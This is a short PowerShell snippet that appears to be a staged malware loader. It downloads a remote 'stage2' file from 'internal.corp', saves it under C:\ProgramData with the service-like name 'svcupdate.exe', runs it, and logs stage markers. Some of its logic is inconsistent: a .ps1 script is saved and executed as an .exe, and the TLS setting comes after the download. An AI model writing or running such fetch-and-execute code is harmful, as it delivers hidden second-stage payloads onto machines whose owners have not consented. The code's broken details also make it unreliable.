
try { $TargetUrl = 'https://internal.corp/stage2.ps1'; $WorkingPath = "C:\ProgramData\svcupdate.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $WorkingPath -UseBasicParsing; & $WorkingPath; Write-Verbose "stage marker 4 reached"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Loader step failed" }
